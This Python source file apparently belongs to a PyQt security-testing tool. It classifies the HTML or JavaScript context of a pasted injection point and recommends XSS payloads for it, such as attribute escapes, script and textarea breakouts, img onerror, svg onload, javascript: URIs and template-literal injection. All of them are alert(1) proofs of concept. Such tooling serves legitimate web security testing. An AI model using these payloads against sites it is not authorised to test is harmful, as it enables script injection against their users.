"""
上下文适配标签页 - 完全按照原版实现
"""
from gui import *
import re


class ContextTab(QWidget):
    """上下文适配器标签页"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent_window = parent
        self.context_payloads = {}
        self.init_ui()

    def init_ui(self):
        """初始化界面 - 左右布局"""
        main_layout = QHBoxLayout(self)
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(20)

        # 左侧：输入区域
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0, 0, 0, 0)

        self.context_info = QLabel("粘贴注入点代码，自动识别上下文并推荐payload")
        self.context_info.setStyleSheet("color: #606266; padding: 10px; font-size: 13px;")
        left_layout.addWidget(self.context_info)

        input_group = QGroupBox("注入点代码")
        input_layout = QVBoxLayout()

        self.context_input = QTextEdit()
        self.context_input.setPlaceholderText('例如:\n<input value="[注入点]">\n或\n<script>var x="[注入点]";</script>')
        self.context_input.setStyleSheet("padding: 10px; font-size: 13px;")
        self.context_input.setMaximumHeight(200)
        self.context_input.setFocusPolicy(Qt.StrongFocus)
        input_layout.addWidget(self.context_input)

        input_group.setLayout(input_layout)
        left_layout.addWidget(input_group)

        detect_btn = QPushButton("智能识别")
        detect_btn.clicked.connect(self.detect_context)
        detect_btn.setStyleSheet("padding: 10px 20px; font-size: 13px; font-weight: 400;")
        left_layout.addWidget(detect_btn)

        # 识别结果
        result_group = QGroupBox("识别结果")
        result_layout = QVBoxLayout()

        self.context_result = QLabel("等待识别...")
        self.context_result.setStyleSheet("padding: 15px; background: #f5f7fa; border-radius: 4px;")
        self.context_result.setWordWrap(True)
        result_layout.addWidget(self.context_result)

        result_group.setLayout(result_layout)
        left_layout.addWidget(result_group)

        main_layout.addWidget(left_panel, 2)

        # 右侧：推荐payload
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)

        recommend_group = QGroupBox("推荐Payload")
        recommend_layout = QVBoxLayout()

        self.context_list = QListWidget()
        self.context_list.currentItemChanged.connect(self.on_context_payload_selected)
        self.context_list.setFocusPolicy(Qt.NoFocus)
        recommend_layout.addWidget(self.context_list)

        recommend_group.setLayout(recommend_layout)
        right_layout.addWidget(recommend_group)

        # 预览
        preview_group = QGroupBox("Payload预览")
        preview_layout = QVBoxLayout()

        self.context_preview = QTextEdit()
        self.context_preview.setReadOnly(True)
        self.context_preview.setStyleSheet("padding: 10px; font-size: 13px;")
        self.context_preview.setFocusPolicy(Qt.NoFocus)
        preview_layout.addWidget(self.context_preview)

        copy_btn = QPushButton("复制")
        copy_btn.clicked.connect(self.copy_context_payload)
        preview_layout.addWidget(copy_btn)

        preview_group.setLayout(preview_layout)
        right_layout.addWidget(preview_group)

        main_layout.addWidget(right_panel, 3)

    def detect_context(self):
        """检测上下文"""
        code = self.context_input.toPlainText().strip()
        if not code:
            QMessageBox.warning(self, '提示', '请输入注入点代码')
            return

        context_type = None
        recommendations = []

        # 检测JavaScript模板字符串 - 优先检测
        if "${" in code and "`" in code:
            context_type = "JavaScript模板字符串"
            recommendations = [
                ("模板字符串注入", '${alert(1)}'),
                ("闭合模板", '}</script><script>alert(1)</script><script>'),
                ("HTML注入", '</div><img src=x onerror=alert(1)>'),
            ]

        # 检测HTML属性
        elif 'value="' in code or "value='" in code:
            context_type = "HTML属性 (value)"
            recommendations = [
                ("属性逃逸-双引号", '"><img src=x onerror=alert(1)>'),
                ("属性逃逸-单引号", "'><img src=x onerror=alert(1)>"),
                ("闭合标签", '</input><script>alert(1)</script>'),
            ]

        # 检测JavaScript字符串
        elif ("let " in code or "var " in code or "const " in code) and ("'" in code or '"' in code):
            if '"' in code and code.count('"') >= 2:
                context_type = "JavaScript字符串 (双引号)"
                recommendations = [
                    ("字符串逃逸-双引号", '";alert(1)//'),
                    ("注释逃逸", '*/alert(1)//'),
                ]
            elif "'" in code and code.count("'") >= 2:
                context_type = "JavaScript字符串 (单引号)"
                recommendations = [
                    ("字符串逃逸-单引号", "';alert(1)//"),
                    ("注释逃逸", "*/alert(1)//"),
                ]

        # 检测href属性
        elif 'href=' in code.lower():
            context_type = "URL上下文 (href)"
            recommendations = [
                ("javascript协议", 'javascript:alert(1)'),
                ("data协议", 'data:text/html,<script>alert(1)</script>'),
            ]

        # 检测事件属性
        elif 'onclick=' in code.lower() or 'onerror=' in code.lower():
            context_type = "事件处理器上下文"
            recommendations = [
                ("直接注入", 'alert(1)'),
                ("反引号", 'alert`1`'),
            ]

        # 检测textarea
        elif '<textarea' in code.lower():
            context_type = "Textarea标签"
            recommendations = [
                ("textarea逃逸", '</textarea><script>alert(1)</script>'),
                ("textarea逃逸-img", '</textarea><img src=x onerror=alert(1)>'),
            ]

        # 检测注释
        elif '<!--' in code:
            context_type = "HTML注释"
            recommendations = [
                ("注释逃逸", '--><script>alert(1)</script><!--'),
                ("注释逃逸-img", '--><img src=x onerror=alert(1)><!--'),
            ]

        # 默认：普通HTML
        else:
            context_type = "普通HTML上下文"
            recommendations = [
                ("基础-script", '<script>alert(1)</script>'),
                ("img-onerror", '<img src=x onerror=alert(1)>'),
                ("svg-onload", '<svg onload=alert(1)>'),
            ]

        # 显示结果
        result_html = f"""
        <div style='line-height: 1.8;'>
        <p><b>识别类型：</b><span style='color: #374151; font-weight: 400;'>{context_type}</span></p>
        <p><b>推荐数量：</b>{len(recommendations)} 个payload</p>
        <p><b>建议：</b>按优先级排序，从上到下依次测试</p>
        </div>
        """
        self.context_result.setText(result_html)
        self.context_result.setTextFormat(Qt.RichText)

        # 填充推荐列表
        self.context_list.clear()
        self.context_payloads = {}
        for name, payload in recommendations:
            self.context_list.addItem(f"{name}")
            self.context_payloads[f"{name}"] = payload

        if recommendations:
            self.context_list.setCurrentRow(0)

        if self.parent_window:
            self.parent_window.statusBar().showMessage(f'识别完成，推荐{len(recommendations)}个payload', 3000)

    def on_context_payload_selected(self, current, previous):
        """选择推荐payload"""
        if current:
            payload = self.context_payloads.get(current.text(), "")

            # 获取用户输入的代码
            original_code = self.context_input.toPlainText().strip()

            # 生成完整示例
            if original_code:
                # 智能查找注入点
                # 方式1: 查找明确的[注入点]标记
                if '[注入点]' in original_code or '注入点' in original_code:
                    complete_code = original_code.replace('[注入点]', payload).replace('注入点', payload)
                # 方式2: 查找空字符串 '' 或 ""
                elif re.search(r"['\"][\s]*['\"]", original_code):
                    # 替换第一个空字符串或只有空格的字符串
                    complete_code = re.sub(r"(['\"])([\s]*)(['\"])", r'\1' + payload + r'\3', original_code, count=1)
                else:
                    # 方式3: 查找变量赋值
                    match = re.search(r"(let|var|const)\s+\w+\s*=\s*(['\"])([^'\"]*)\2", original_code)
                    if match:
                        # 在字符串内容位置注入
                        old_value = match.group(3)
                        complete_code = original_code.replace(f"{match.group(2)}{old_value}{match.group(2)}",
                                                             f"{match.group(2)}{payload}{match.group(2)}", 1)
                    else:
                        complete_code = f"{original_code}\n\n/* 注入payload: */\n{payload}"

                # 显示完整代码
                full_preview = f"/* ===== 原始代码 ===== */\n{original_code}\n\n/* ===== 注入后完整代码 ===== */\n{complete_code}\n\n/* ===== 单独的Payload ===== */\n{payload}"
            else:
                full_preview = payload

            self.context_preview.setPlainText(full_preview)

    def copy_context_payload(self):
        """复制推荐payload"""
        text = self.context_preview.toPlainText()
        if text:
            QApplication.clipboard().setText(text)
            if self.parent_window:
                self.parent_window.statusBar().showMessage('已复制', 2000)
